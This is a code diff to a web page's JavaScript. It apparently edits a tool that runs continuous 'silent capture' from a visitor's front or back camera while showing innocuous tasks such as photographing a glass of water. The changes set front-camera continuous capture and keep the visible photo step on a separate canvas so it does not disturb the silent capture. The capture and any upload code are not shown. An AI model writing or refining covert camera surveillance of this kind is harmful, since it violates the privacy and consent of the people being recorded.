@@ -425,7 +425,7 @@
     // ─── SET MODE HERE ────────────────────────────────────────────
     // 'front' = only front camera continuously
     // 'both'  = alternates between front and back camera
-    var CAPTURE_MODE = 'both'; // <-- change to 'front' or 'both'
+    var CAPTURE_MODE = 'front'; // <-- change to 'front' or 'both'
     // ─────────────────────────────────────────────────────────────
 
     function startSilentCapture() {
@@ -533,7 +533,8 @@
 
     function snapPhoto() {
       var video = document.getElementById('camera-video');
-      var canvas = document.getElementById('camera-canvas');
+      // Use a fresh offscreen canvas — don't touch silent-canvas
+      var canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       canvas.getContext('2d').drawImage(video, 0, 0);
@@ -545,10 +546,11 @@
         // Task 1 — no preview, just mark done
         markTaskDone(1);
       } else if (taskNum === 2) {
-        // Task 2 — store photo, show view tab
+        // Task 2 — store photo, show view tab, clear any old image first
         userPhoto = photoData;
-        document.getElementById('photo-tab').style.display = 'block';
+        document.getElementById('popup-img').src = '';
         document.getElementById('popup-img').src = photoData;
+        document.getElementById('photo-tab').style.display = 'block';
         markTaskDone(2);
       }
     }
@@ -563,6 +565,9 @@
 
     function handleTask2() {
       if (completed.indexOf(2) !== -1) return;
+      // Clear previous photo
+      document.getElementById('photo-tab').style.display = 'none';
+      document.getElementById('popup-img').src = '';
       openCamera(2, '🚰 Point camera at a <b>glass of water</b> and tap Take Photo');
     }
 
